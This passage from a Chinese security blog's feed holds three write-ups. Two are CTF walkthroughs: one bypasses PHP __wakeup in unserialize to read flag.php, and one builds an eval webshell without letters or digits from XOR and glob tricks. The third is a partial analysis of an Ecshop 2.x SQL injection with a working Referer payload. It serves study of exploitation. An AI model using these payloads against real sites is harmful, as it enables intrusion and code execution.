class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>该程序的输出结果如下</strong></p><p><img src="http://pic.c1imber.top/blog/181031/iGL0DDG152.png?imageslim" alt="mark"><br><strong>需要注意的是<code>private</code>、<code>protected</code>、<code>public</code>三个对象的属性经过序列化后的字符串格式是有区别的，这在构造POC的时候十分关键，通过抓包看到的序列化数据实际如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">"\00test\00a"</span>;s:<span class="number">7</span>:<span class="string">"private"</span>;s:<span class="number">4</span>:<span class="string">"\00*\00b"</span>;s:<span class="number">9</span>:<span class="string">"protected"</span>;s:<span class="number">1</span>:<span class="string">"c"</span>;s:<span class="number">6</span>:<span class="string">"public"</span>;&#125;</div><div class="line">\\<span class="keyword">private</span>属性序列化后:数据类型:属性名长度:<span class="string">"\00类名\00属性名"</span>;数据类型:属性值长度:<span class="string">"属性值"</span>;</div><div class="line">\\<span class="keyword">protected</span>属性序列化后:数据类型:属性名长度:<span class="string">"\00*\00属性名"</span>;数据类型:属性值长度:<span class="string">"属性值"</span>;</div><div class="line">\\<span class="keyword">public</span>属性序列化后:数据类型:属性名长度:<span class="string">"属性名"</span>;数据类型:属性值长度:<span class="string">"属性值"</span>;</div></pre></td></tr></table></figure><p><strong>其中常见的php数据类型对应的字母标识如下</strong></p><pre><code>a - arrayb - booleand - doublei - integero - common objectr - references - non-escaped binary stringS - escaped binary stringC - custom objectO - classN - nullR - pointer referenceU - unicode string</code></pre><p><strong>接着看上面的那道题,代码很明显存在php反序列化漏洞,题目要求利用php反序列化漏洞去读取与<code>index.php</code>同一目录下的<code>flag.php</code>,代码流程很简单,就是将传入的<code>$_GET[&#39;file&#39;]</code>参数经过base64解码后再进行反序列化,如果处理结果是该对象的一个序列化字符串,在进行反序列化的时候就会触发该对象的<code>__wakeup</code>方法,并在代码结束时触发该对象的<code>__destruct</code>方法,此时对象当中的<code>$file</code>变量被传入<code>show_source</code>,如果<code>$file</code>是一个文件名,就会显示出对应文件的源代码,<code>$file</code>变量又刚好是可控的,很容易构造出读取<code>flag.php</code>的payload</strong></p><p><strong>构造序列化字符串,设置对象的<code>protected</code>属性$file的值为<code>flag.php</code></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">5</span>:<span class="string">"SoFun"</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">"\00*\00file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</div></pre></td></tr></table></figure><p><strong>再经过base64编码</strong></p><pre><code>Tzo1OiJTb0Z1biI6MTp7czo3OiIAKgBmaWxlIjtzOjg6ImZsYWcucGhwIjt9</code></pre><p><strong>将得到的base64字符串传入<code>$_GET[&#39;file&#39;]</code>,但是看到并没有显示出<code>flag.php</code>的源码,这里依旧显示的是<code>index.php</code>的源代码,原因就是传入的序列化字符串在反序列化的时候会触发对象的<code>__wakeup</code>魔术方法,而在<code>__wakeup</code>魔术方法中,将传入的<code>$file</code>属性值设置成了<code>index.php</code>,之后触发<code>__destruct</code>方法时,<code>$file</code>的值就变为了<code>index.php</code>,所以这里需要绕过<code>__wakeup</code>函数,这里需要利用<code>__wakeup</code>函数的一个漏洞</strong></p><h3 id="wakeup-函数漏洞"><a href="#wakeup-函数漏洞" class="headerlink" title="wakeup()函数漏洞"></a>wakeup()函数漏洞</h3><p><strong>当序列化字符串当中属性个数值大于实际的属性个数时,就会导致反序列化异常,从而跳过<code>__wakeup</code>函数,具体的底层原理可以看下面的解释</strong><br><img src="http://pic.c1imber.top/blog/181031/J0bm2IaaCc.png?imageslim" alt="mark"></p><p><strong>那么就可以构造序列化字符串</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">5</span>:<span class="string">"SoFun"</span>:<span class="number">2</span>:&#123;S:<span class="number">7</span>:<span class="string">"\00*\00file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</div></pre></td></tr></table></figure><p><strong>将对象属性的个数设置为2,而实际的属性个数为1,使其反序列化产生异常,从而绕过<code>__wakeup</code>函数，将序列化字符串进行base64编码后</strong></p><pre><code>Tzo1OiJTb0Z1biI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ==</code></pre><p><strong>成功读取到了<code>flag.php</code>的源码</strong><br><img src="http://pic.c1imber.top/blog/181031/hIkKA7Ag38.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;深入学习PHP反序列化漏洞-绕过-wakeup-函数&quot;&gt;&lt;a href=&quot;#深入学习PHP反序列化漏洞-绕过-wakeup-函数&quot; class=&quot;headerlink&quot; title=&quot;深入学习PHP反序列化漏洞-绕过_wakeup()函数&quot;&gt;&lt;/a&gt;深入学习PHP反序列化漏洞-绕过_wakeup()函数&lt;/h1&gt;&lt;h3 id=&quot;题目代码&quot;&gt;&lt;a href=&quot;#题目代码&quot; class=&quot;headerlink&quot; title=&quot;题目代码&quot;&gt;&lt;/a&gt;题目代码&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;代码如下，要求利用php反序列化漏洞去读取&lt;code&gt;flag.php&lt;/code&gt;文件中的内容&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;SoFun&lt;/span&gt;&lt;/span&gt;&amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;protected&lt;/span&gt; $file=&lt;span class=&quot;string&quot;&gt;&#39;index.php&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!&lt;span class=&quot;keyword&quot;&gt;empty&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file)) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(strchr(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt; file,&lt;span class=&quot;string&quot;&gt;&quot;\\&quot;&lt;/span&gt;)===&lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt; &amp;amp;&amp;amp;  strchr(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file, &lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;)===&lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          show_source(dirname (&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;).&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;.&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt; -&amp;gt;file);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;      &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Wrong filename.&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__wakeup&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123; &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt; file=&lt;span class=&quot;string&quot;&gt;&#39;index.php&#39;&lt;/span&gt;; &amp;#125; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__toString&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt; ;&amp;#125;&amp;#125;     &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;file&#39;&lt;/span&gt;]))&amp;#123; show_source(&lt;span class=&quot;string&quot;&gt;&#39;index.php&#39;&lt;/span&gt;); &amp;#125; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       $file=base64_decode( $_GET[&lt;span class=&quot;string&quot;&gt;&#39;file&#39;&lt;/span&gt;]); &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; unserialize($file ); &amp;#125; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;   &lt;span class=&quot;comment&quot;&gt;#&amp;lt;!--key in flag.php--&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://lawlietweb.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://lawlietweb.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>记一次ctf极限利用-不包含数字字母的webshell</title>
    <link href="http://lawlietweb.com/2018/10/08/%E8%AE%B0%E4%B8%80%E6%AC%A1ctf%E6%9E%81%E9%99%90%E5%88%A9%E7%94%A8-%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E7%9A%84webshell/"/>
    <id>http://lawlietweb.com/2018/10/08/记一次ctf极限利用-不包含数字字母的webshell/</id>
    <published>2018-10-08T03:22:03.000Z</published>
    <updated>2018-12-19T11:34:30.051Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记一次ctf极限利用-不包含数字字母的webshell"><a href="#记一次ctf极限利用-不包含数字字母的webshell" class="headerlink" title="记一次ctf极限利用-不包含数字字母的webshell"></a>记一次ctf极限利用-不包含数字字母的webshell</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>问题来自于同事给我一道安恒的ctf赛题，题目代码如下</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include <span class="string">'flag.php'</span>;</div><div class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'code'</span>]))&#123;</div><div class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">'code'</span>];</div><div class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;35)&#123;</div><div class="line">        die(<span class="string">"Long."</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,<span class="variable">$code</span>))&#123;</div><div class="line">        die(<span class="string">"NO."</span>);</div><div class="line">    &#125;</div><div class="line">    @<span class="built_in">eval</span>(<span class="variable">$code</span>);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    highlight_file(__FILE__);</div><div class="line">&#125;</div><div class="line">//<span class="variable">$hint</span> =  <span class="string">"php function getFlag() to get flag"</span>;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><a id="more"></a><p><strong>看到这个题目后我的最先思路是想办法去执行getFlag这个函数去得到flag，于是想到可以利用php当中两个字符异或后可以得到另外字符这一个特性，将不为数字字母的字符异或后得到想要的字符,首先将所有可能性打印出来</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"><span class="variable">$a</span>=array(<span class="string">'!'</span>,<span class="string">'"'</span>,<span class="string">'#'</span>,<span class="string">'$'</span>,<span class="string">'%'</span>,<span class="string">','</span>,<span class="string">'&amp;'</span>,<span class="string">'\\'</span>,<span class="string">"'"</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'.'</span>,<span class="string">'*'</span>,<span class="string">'+'</span>,<span class="string">'-'</span>,<span class="string">'/'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">'^'</span>,<span class="string">'_'</span>,<span class="string">'`'</span>,<span class="string">'&#123;'</span>,<span class="string">'|'</span>,<span class="string">'&#125;'</span>,<span class="string">'~'</span>,<span class="string">':'</span>,<span class="string">';'</span>,<span class="string">'&lt;'</span>,<span class="string">'='</span>,<span class="string">'&gt;'</span>,<span class="string">'?'</span>,<span class="string">'@'</span>);</div><div class="line">foreach (<span class="variable">$a</span> as <span class="variable">$v1</span>) &#123;</div><div class="line"> foreach (<span class="variable">$a</span> as <span class="variable">$v2</span>) &#123;</div><div class="line"> <span class="variable">$r</span>=<span class="variable">$v1</span>^<span class="variable">$v2</span>;</div><div class="line"> <span class="built_in">echo</span> <span class="variable">$r</span>.<span class="string">'='</span>.<span class="variable">$v1</span>.<span class="string">'^'</span>.<span class="variable">$v2</span>;</div><div class="line"> <span class="built_in">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>经过测试得到：</strong></p><pre><code>g=&apos;^@e=[^&gt;t=]^)F=`^&amp;l=@^,a=!^@g=&apos;^@&quot;&apos;[]`@!&apos;&quot;^&quot;@&gt;)&amp;,@@&quot;=getFlag</code></pre><p><strong>接下来利用php的可变变量特性构造payload</strong></p><pre><code>$_=&quot;&apos;[]`@!&apos;&quot;^&quot;@&gt;)&amp;,@@&quot;;$_();</code></pre><p><strong>传入后最终变为：</strong><br>    eval(getFlag())</p><p><strong>但是这道题的正则也过滤了<code>$</code>和<code>_</code>,导致自己的这个思路受到了一些限制，后来自己又看了<a href="https://www.anquanke.com/post/id/160582?from=singlemessage#h2-2" title="一叶飘零师傅的解法" target="_blank" rel="external">一叶飘零师傅的解法</a>，思路是可以利用反引号执行命令将flag文件读取出来，加上利用linux当中<code>?</code>这个通配符就可以达到不使用数字字母与<code>$_</code>就可以获取flag的目的，但是由于<code>?</code>这个通配符是匹配任意字符的，导致结果当中会出现很多垃圾数据，而且我用这个方法得到的结果并不完整，不知道是哪里出了问题</strong></p><p><strong>于是自己向p牛小密圈发起了求助，经过p牛和小密圈大佬们的指点，得到了很多思路和有趣的知识点，在这里将自己学到的记录分享一下</strong></p><p><strong>首先，需要考虑到php5和php7的一些差异，php7当中已经可以使用<code>(函数名)()</code>这样的格式去执行一些动态函数了，所以这道题如果放到php7环境当中的话，就会比较好解，利用上面所说的那个特性就可以达到执行函数的目的，以执行phpinfo函数为例，构造payload：<code>(&quot;\(\@@&amp;/&quot;^&quot;,@,).@@&quot;)();</code>,将payload传入get参数code即可,注意一点，为了避免特殊符号影响，需要将payload进行url编码</strong><br><img src="http://pic.c1imber.top/blog/181008/4DI2B9H38I.png?imageslim" alt="mark"></p><p><strong>如果是php5的话，目前暂时还没有找到不使用数字字母和<code>$_</code>这些符号就可以执行动态函数去读取flag的方法，在这里需要使用执行命令的方法，但是需要避免无关的垃圾数据，经过p牛师傅的指点get到了一个很棒的思路：可以通过构造一个文件上传的数据包，通过文件上传可以在服务器的tmp目录下生成一个上传的php临时文件，文件的内容为要执行的命令，这个临时文件的生命周期就在php代码执行的期间，php代码执行结束就会自动删除，这样的话就可以在上传文件的同时传入GET参数去执行这个临时文件里面的命令，这里包含了几个知识点：</strong></p><pre><code>1.有关linux glob通配符的知识点：linux当中可以使用glob通配符匹配任意文件名，？可以匹配任意一个字符，[]里面可以通过ascii码指定匹配的字符范围2.linux当中可以使用.去执行任意文件，即使这个文件没有x执行权限3.php的短标签&lt;?=?&gt;相当于&lt;?php echo?&gt;的作用</code></pre><p><strong>知道了上面的几个点，就可以构造出来不含数字字母<code>$_</code>又可以执行命令的payload</strong></p><pre><code>code=?&gt;&lt;?=`. /???/????????[@-[]`?&gt;</code></pre><p><strong>因为文件长度为<code>/???/?????????</code>的文件有很多，为了避免匹配不到临时文件，这里将文件名的最后字母变为大写，其中<code>@-[</code>之间的ascii码为<code>A-Z</code></strong></p><p><strong>最终的执行结果，当生成的临时文件最后一个字母为大写时，就可以匹配到临时文件执行里面的命令</strong></p><p><img src="http://pic.c1imber.top/blog/181009/1FhGDakc26.png?imageslim" alt="mark"></p><h3 id="我所遇到的一些问题"><a href="#我所遇到的一些问题" class="headerlink" title="我所遇到的一些问题"></a>我所遇到的一些问题</h3><p><strong>我在做这道题的时候遇到了一些问题：自己一开始并不能成功的匹配到php产生的临时文件，为了这个问题还和p牛师傅交流了好久==，最后得到了一个结论：有的linux操作系统和版本并不支持使用<code>[]</code>去匹配指定范围的ascii码，导致不能成功的匹配到php产生的临时文件，于是执行了其它的文件，自然就会失败。我测试的几个操作系统结果如下</strong></p><pre><code>docker centos6（成功）虚拟机 centos6（失败）vps centos7（失败）虚拟机ubuntu16.04（失败）vps ubuntu16.04(失败)</code></pre><p><strong>在这些linux当中，ubuntu里面的shopt是有一个<code>globasciiranges</code>选项的，这个配置项默认并没有开启所以会导致<code>[]</code>不能使用，使用<code>shopt -s globasciiranges</code>命令开启这个选项后就可以成功利用了</strong></p><p><strong>但是centos里面并没有<code>globasciiranges</code>这个配置项，所以暂时还不能成功利用（除了docker的centos6），这里应该就是和linux版本有关系了，最后为了方便理解，附上我的测试截图</strong></p><p><strong>centos7 vps</strong><br><img src="http://pic.c1imber.top/blog/181009/Bc3J9D8c50.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/181009/KAlLeIahBe.png?imageslim" alt="mark"></p><p><strong>ubuntu将shopt里面的<code>globasciiranges</code>开启就能解决问题</strong><br><img src="http://pic.c1imber.top/blog/181009/Fc1Cd2lEbK.png?imageslim" alt="mark"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><strong><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="external">无字母数字webshell之提高篇</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;记一次ctf极限利用-不包含数字字母的webshell&quot;&gt;&lt;a href=&quot;#记一次ctf极限利用-不包含数字字母的webshell&quot; class=&quot;headerlink&quot; title=&quot;记一次ctf极限利用-不包含数字字母的webshell&quot;&gt;&lt;/a&gt;记一次ctf极限利用-不包含数字字母的webshell&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;问题来自于同事给我一道安恒的ctf赛题，题目代码如下&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;?php&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;include &lt;span class=&quot;string&quot;&gt;&#39;flag.php&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(isset(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;code&#39;&lt;/span&gt;]))&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;variable&quot;&gt;$code&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;code&#39;&lt;/span&gt;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(strlen(&lt;span class=&quot;variable&quot;&gt;$code&lt;/span&gt;)&amp;gt;35)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        die(&lt;span class=&quot;string&quot;&gt;&quot;Long.&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&quot;/[A-Za-z0-9_$]+/&quot;&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$code&lt;/span&gt;))&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        die(&lt;span class=&quot;string&quot;&gt;&quot;NO.&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    @&lt;span class=&quot;built_in&quot;&gt;eval&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$code&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    highlight_file(__FILE__);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//&lt;span class=&quot;variable&quot;&gt;$hint&lt;/span&gt; =  &lt;span class=&quot;string&quot;&gt;&quot;php function getFlag() to get flag&quot;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;?&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://lawlietweb.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://lawlietweb.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Ecshop2.x注入漏洞&amp;代码执行漏洞分析</title>
    <link href="http://lawlietweb.com/2018/09/07/Ecshop2.x%20&amp;%203.x%E7%89%88%E6%9C%AC%E6%9C%80%E6%96%B0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <id>http://lawlietweb.com/2018/09/07/Ecshop2.x &amp; 3.x版本最新漏洞分析与利用/</id>
    <published>2018-09-07T01:22:48.000Z</published>
    <updated>2018-12-19T11:33:34.123Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ecshop2-x注入漏洞-amp-代码执行漏洞分析"><a href="#Ecshop2-x注入漏洞-amp-代码执行漏洞分析" class="headerlink" title="Ecshop2.x注入漏洞&amp;代码执行漏洞分析"></a>Ecshop2.x注入漏洞&amp;代码执行漏洞分析</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>Ecshop最近爆出了两个高危漏洞，分别是SQL注入漏洞和代码执行漏洞，刚好自己在学代码审计方面的知识，于是自己针对两个漏洞的成因分析了一波，发现这是一个很有意思的二次漏洞，在这将整个学习过程做个记录</strong><br><a id="more"></a></p><h3 id="SQL注入漏洞分析"><a href="#SQL注入漏洞分析" class="headerlink" title="SQL注入漏洞分析"></a>SQL注入漏洞分析</h3><p><strong>在分析漏洞之前首先来看其中的一个payload</strong></p><pre><code>访问:http://site/user.php?act=login然后在http请求头里面添加：Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}</code></pre><p><strong>由payload看到漏洞的入口位置在<code>user.php</code>这个文件内，通过<code>act=login</code>关键字定位到相关的代码位置</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* 用户登录界面 */</span></div><div class="line"><span class="keyword">elseif</span> ($action == <span class="string">'login'</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act))</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act) &amp;&amp; <span class="keyword">isset</span>($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>]))</div><div class="line">        &#123;</div><div class="line">            $back_act = strpos($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>], <span class="string">'user.php'</span>) ? <span class="string">'./index.php'</span> : $GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            $back_act = <span class="string">'user.php'</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    